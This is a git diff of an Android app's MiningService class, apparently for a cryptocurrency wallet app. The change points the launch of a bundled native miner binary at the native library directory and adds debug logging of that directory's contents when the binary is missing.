@@ -24,19 +24,16 @@ import android.content.SharedPreferences;
 import android.os.Binder;
 import android.os.Build;
 import android.os.IBinder;
-import android.text.LoginFilter;
 import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Toast;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
-import java.util.Locale;
 import java.util.UUID;
-
-import java.io.File;
 
 
 /**
@@ -153,11 +150,15 @@ public class MiningService extends Service {
             process.destroy();
         }
         String fullPath = "";
+        String appDir = "";
         try {
             // write the config
 
             // we'll get these from the config object after it's working
-            String appDir = this.getApplicationInfo().nativeLibraryDir;
+            appDir = this.getApplicationInfo().nativeLibraryDir;
+            //appDir = "/data/data/com.chadananda.cocoawallet/lib/arm64-v8a";
+
+
 
             String wallet = "dERoQY3fRgQfG2HpErJ3R4YYBx4aPKF19LT5EnzVsTNZZDPFRvNz9VWG7owvJUiGqWjZ1btyDPT6DcgC4QKAQGsg9qWePwEsRc.20000";
             String max_bwt = "710";
@@ -171,9 +172,9 @@ public class MiningService extends Service {
 
             String[] pm = {"./libpm.so", args};
 
-            fullPath = privatePath+"/libpm.so";
+            fullPath = appDir+"/libpm.so";
 
-            Log.e("args","args"+appDir);
+            Log.e("args","appdir: "+appDir);
 
             ProcessBuilder pb = new ProcessBuilder( pm );
 
@@ -200,6 +201,20 @@ public class MiningService extends Service {
                 Log.e("launcherror","but file does exist: "+fullPath);
             } else {
                 Log.e("launcherror","file not found: "+fullPath);
+                String outDirString = appDir; //"/data/data/com.chadananda.cocoawallet/lib";
+
+                File ourDir = new File(outDirString);
+                if (ourDir.exists()) {
+                    Log.e("launcherror", "but dir exists: " + outDirString);
+                    File[] ourFiles = ourDir.listFiles();
+                    String myFiles = "";
+                    for (int i = 0; i < ourFiles.length; i++) {
+                        myFiles = myFiles +", "+ ourFiles[i].getName();
+                    }
+                    Log.e("launcherror", "files: " + myFiles);
+                } else {
+                    Log.e("launcherror", "dir not found: "+ outDirString);
+                }
             }
             process = null;
         }
